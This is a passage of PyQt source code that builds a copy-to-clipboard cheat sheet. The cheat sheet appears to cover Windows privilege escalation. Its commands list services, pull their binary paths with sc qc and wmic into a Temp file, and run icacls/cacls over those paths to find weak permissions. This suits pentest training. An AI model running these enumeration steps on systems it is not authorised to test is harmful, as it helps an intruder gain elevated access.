        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(543, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(544, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(545, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(546, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan14
        if hasattr(self, 'wpe_29_Scan14'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan14)
            self.wpe_29_Scan14.deleteLater()
        self.wpe_29_Scan14 = QLabel("FOR /F %i in (ServiceNames.txt) DO echo %i")
        self.wpe_29_Scan14.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(547,self.wpe_29_Scan14)
     
        # wpe_29_Scan14_Copy
        if hasattr(self, 'wpe_29_Scan14_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan14_Copy)
            self.wpe_29_Scan14_Copy.deleteLater()
        self.wpe_29_Scan14_Copy = QPushButton()
        self.wpe_29_Scan14_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan14_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan14_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan14.text()))
        self.wpe_29_Scan14_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan14 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan14_Copy)
        label_layout.addWidget(self.wpe_29_Scan14)
        self.tab4_container_layout.insertLayout(548, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(549, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(550, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(551, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(552, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan15
        if hasattr(self, 'wpe_29_Scan15'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan15)
            self.wpe_29_Scan15.deleteLater()
        self.wpe_29_Scan15 = QLabel("type ServiceNames.txt")
        self.wpe_29_Scan15.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(553,self.wpe_29_Scan15)
     
        # wpe_29_Scan15_Copy
        if hasattr(self, 'wpe_29_Scan15_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan15_Copy)
            self.wpe_29_Scan15_Copy.deleteLater()
        self.wpe_29_Scan15_Copy = QPushButton()
        self.wpe_29_Scan15_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan15_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan15_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan15.text()))
        self.wpe_29_Scan15_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan15 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan15_Copy)
        label_layout.addWidget(self.wpe_29_Scan15)
        self.tab4_container_layout.insertLayout(554, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(555, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(556, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(557, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(558, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan16
        if hasattr(self, 'wpe_29_Scan16'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan16)
            self.wpe_29_Scan16.deleteLater()
        self.wpe_29_Scan16 = QLabel("FOR /F \"tokens=2 delims= \" %i in (ServiceNames.txt) DO @echo %i >> Services.txt")
        self.wpe_29_Scan16.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(559,self.wpe_29_Scan16)
     
        # wpe_29_Scan16_Copy
        if hasattr(self, 'wpe_29_Scan16_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan16_Copy)
            self.wpe_29_Scan16_Copy.deleteLater()
        self.wpe_29_Scan16_Copy = QPushButton()
        self.wpe_29_Scan16_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan16_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan16_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan16.text()))
        self.wpe_29_Scan16_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan16 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan16_Copy)
        label_layout.addWidget(self.wpe_29_Scan16)
        self.tab4_container_layout.insertLayout(560, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(561, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(562, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(563, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(564, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan17
        if hasattr(self, 'wpe_29_Scan17'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan17)
            self.wpe_29_Scan17.deleteLater()
        self.wpe_29_Scan17 = QLabel("FOR /F %i in (Services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt")
        self.wpe_29_Scan17.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(565,self.wpe_29_Scan17)
     
        # wpe_29_Scan17_Copy
        if hasattr(self, 'wpe_29_Scan17_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan17_Copy)
            self.wpe_29_Scan17_Copy.deleteLater()
        self.wpe_29_Scan17_Copy = QPushButton()
        self.wpe_29_Scan17_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan17_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan17_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan17.text()))
        self.wpe_29_Scan17_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan17 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan17_Copy)
        label_layout.addWidget(self.wpe_29_Scan17)
        self.tab4_container_layout.insertLayout(566, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(567, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(568, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(569, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(570, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan18
        if hasattr(self, 'wpe_29_Scan18'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan18)
            self.wpe_29_Scan18.deleteLater()
        self.wpe_29_Scan18 = QLabel("type path.txt")
        self.wpe_29_Scan18.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(571,self.wpe_29_Scan18)
     
        # wpe_29_Scan18_Copy
        if hasattr(self, 'wpe_29_Scan18_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan18_Copy)
            self.wpe_29_Scan18_Copy.deleteLater()
        self.wpe_29_Scan18_Copy = QPushButton()
        self.wpe_29_Scan18_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan18_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan18_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan18.text()))
        self.wpe_29_Scan18_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan18 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan18_Copy)
        label_layout.addWidget(self.wpe_29_Scan18)
        self.tab4_container_layout.insertLayout(572, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(573, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(574, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(575, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(576, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan19
        if hasattr(self, 'wpe_29_Scan19'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan19)
            self.wpe_29_Scan19.deleteLater()
        self.wpe_29_Scan19 = QLabel("[ - recursively execute icacls.exe or cacls.exe for permissions ]")
        self.wpe_29_Scan19.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(577,self.wpe_29_Scan19)
     
        # wpe_29_Scan20
        if hasattr(self, 'wpe_29_Scan20'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan20)
            self.wpe_29_Scan20.deleteLater()
        self.wpe_29_Scan20 = QLabel("cd \"C:\\Windows\\TEMP\\\"")
        self.wpe_29_Scan20.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(578,self.wpe_29_Scan20)
     
        # wpe_29_Scan20_Copy
        if hasattr(self, 'wpe_29_Scan20_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan20_Copy)
            self.wpe_29_Scan20_Copy.deleteLater()
        self.wpe_29_Scan20_Copy = QPushButton()
        self.wpe_29_Scan20_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan20_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan20_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan20.text()))
        self.wpe_29_Scan20_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan20 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan20_Copy)
        label_layout.addWidget(self.wpe_29_Scan20)
        self.tab4_container_layout.insertLayout(579, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(580, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(581, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(582, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(583, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan21
        if hasattr(self, 'wpe_29_Scan21'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan21)
            self.wpe_29_Scan21.deleteLater()
        self.wpe_29_Scan21 = QLabel("for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> C:\\windows\\Temp\\permissions.txt")
        self.wpe_29_Scan21.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(584,self.wpe_29_Scan21)
     
        # wpe_29_Scan21_Copy
        if hasattr(self, 'wpe_29_Scan21_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan21_Copy)
            self.wpe_29_Scan21_Copy.deleteLater()
        self.wpe_29_Scan21_Copy = QPushButton()
        self.wpe_29_Scan21_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan21_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan21_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan21.text()))
        self.wpe_29_Scan21_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan21 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan21_Copy)
        label_layout.addWidget(self.wpe_29_Scan21)
        self.tab4_container_layout.insertLayout(585, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(586, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(587, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(588, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(589, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan22
        if hasattr(self, 'wpe_29_Scan22'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan22)
            self.wpe_29_Scan22.deleteLater()
        self.wpe_29_Scan22 = QLabel("[ - icacls.exe ]")
        self.wpe_29_Scan22.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(590,self.wpe_29_Scan22)
     
        # wpe_29_Scan23
        if hasattr(self, 'wpe_29_Scan23'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan23)
            self.wpe_29_Scan23.deleteLater()
        self.wpe_29_Scan23 = QLabel("for /f eol^=^\"^ delims^=^\" %a in (C:\\windows\\Temp\\permissions.txt) do cmd.exe /c icacls \"%a\"")
        self.wpe_29_Scan23.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(591,self.wpe_29_Scan23)
     
        # wpe_29_Scan23_Copy
        if hasattr(self, 'wpe_29_Scan23_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan23_Copy)
            self.wpe_29_Scan23_Copy.deleteLater()
        self.wpe_29_Scan23_Copy = QPushButton()
        self.wpe_29_Scan23_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan23_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan23_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan23.text()))
        self.wpe_29_Scan23_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan23 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan23_Copy)
        label_layout.addWidget(self.wpe_29_Scan23)
        self.tab4_container_layout.insertLayout(592, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(593, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(594, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(595, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(596, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan24
        if hasattr(self, 'wpe_29_Scan24'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan24)
            self.wpe_29_Scan24.deleteLater()
        self.wpe_29_Scan24 = QLabel("[ - cacls.exe ]")
        self.wpe_29_Scan24.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(597,self.wpe_29_Scan24)
     
        # wpe_29_Scan25
        if hasattr(self, 'wpe_29_Scan25'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan25)
            self.wpe_29_Scan25.deleteLater()
        self.wpe_29_Scan25 = QLabel("for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\Temp\\permissions.txt) do cmd.exe /c cacls \"%a\"")
        self.wpe_29_Scan25.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(598,self.wpe_29_Scan25)
     
        # wpe_29_Scan25_Copy
        if hasattr(self, 'wpe_29_Scan25_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan25_Copy)
            self.wpe_29_Scan25_Copy.deleteLater()
        self.wpe_29_Scan25_Copy = QPushButton()
        self.wpe_29_Scan25_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan25_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan25_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan25.text()))
        self.wpe_29_Scan25_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan25 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan25_Copy)
        label_layout.addWidget(self.wpe_29_Scan25)
        self.tab4_container_layout.insertLayout(599, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
